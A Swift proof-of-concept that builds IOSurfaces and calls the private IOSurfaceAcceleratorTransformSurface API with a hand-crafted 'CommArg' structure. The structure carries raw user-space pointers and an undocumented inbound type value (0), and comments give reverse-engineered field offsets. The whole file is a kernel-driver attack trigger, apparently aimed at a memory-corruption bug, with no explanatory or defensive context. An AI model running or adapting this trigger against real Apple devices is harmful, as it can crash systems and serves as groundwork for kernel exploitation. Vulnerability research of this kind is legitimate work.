import CoreVideo
import IOSurface

// size is 0x28
struct CommArg {
  let inboundType: Int32  // 0x0
  let inboundAddress: UInt64  // 0x8
  let inboundSize: Int32  // 0x10
  let outboundType: Int32  // 0x14
  let outboundAddress: UInt64  // 0x18
  let unused20: Int64  // 0x20
}

// Not supported on M1 Mac Mini
let kInboundTypeASELegacy = 1
// Not supported on M1 Mac Mini
let kInboundTypeHDRLegacy = 2
// ???
let kInboundTypeHDR = 3
// Args constructed by ASEProcessing - CA::ASEScalerStatistics::create_iosa_params(__IOSurface*, __IOSurface*)
let kInboundTypeASE = 4

// Hardcoded length = 0x17c
let kOutboundTypeASE = 1
// Hardcoded length = 0x1008
let kOutboundTypeHDR = 2

func snakesOnAPlane() {
  // ASE prints an error if width/height < 32
  guard
    let sourceSurface = IOSurface(properties: [
      .width: 32, .height: 32, .pixelFormat: kCVPixelFormatType_32BGRA,
    ])
  else {
    print("source surface is null")
    return
  }
  guard
    let destinationSurface = IOSurface(properties: [
      .width: 32, .height: 32, .pixelFormat: kCVPixelFormatType_32BGRA,
    ])
  else {
    print("dest surface is null")
    return
  }
  // https://github.com/WebKit/WebKit/commit/5e7ebb4f4f0592ad2911b8eb84da81ba900b0f4a
  var accelerator: IOSurfaceAcceleratorRef? = nil
  var err = IOSurfaceAcceleratorCreate(nil, nil, &accelerator)
  guard err == kIOReturnSuccess else {
    print("accelerator fail: \(err)")
    return
  }
  guard let accelerator = accelerator else {
    print("accelerator null")
    return
  }
  let firstMutableInput = NSMutableData(length: 0x4000)!
  let firstMutableOutput = NSMutableData(length: 0x4000)!
  let inboundAddress = UInt64(UInt(bitPattern: firstMutableInput.mutableBytes))
  let outboundAddress = UInt64(UInt(bitPattern: firstMutableOutput.mutableBytes))
  #if false
    var firstCommArg = CommArg(
      inboundType: Int32(kInboundTypeASE), inboundAddress: inboundAddress,
      inboundSize: Int32(firstMutableInput.length), outboundType: Int32(kOutboundTypeASE),
      outboundAddress: outboundAddress, unused20: 0)
  #endif
  var firstCommArg = CommArg(
    inboundType: 0, inboundAddress: inboundAddress, inboundSize: Int32(firstMutableInput.length),
    outboundType: 1,
    outboundAddress: outboundAddress, unused20: 0)
  let firstData = Data(bytes: &firstCommArg, count: MemoryLayout.size(ofValue: firstCommArg))
  // kIOSurfaceAcceleratorDirectionalScalingEnable turns on ASE
  let transformOptions: [String: Any] = [
    String(kIOSurfaceAcceleratorDirectionalScalingEnable): true,
    String(kIOSurfaceAcceleratorComm): [firstData],
  ]
  err = IOSurfaceAcceleratorTransformSurface(
    accelerator, sourceSurface, destinationSurface, /*options=*/
    transformOptions as CFDictionary, /*pCropRectangles=*/
    nil, /*pCompletion=*/ nil, /*pSwap=*/ nil, /*pCommandID=*/ nil)
  guard err == kIOReturnSuccess else {
    print("transform fail: \(err) \(String(cString: mach_error_string(err)!))")
    return
  }
}

snakesOnAPlane()
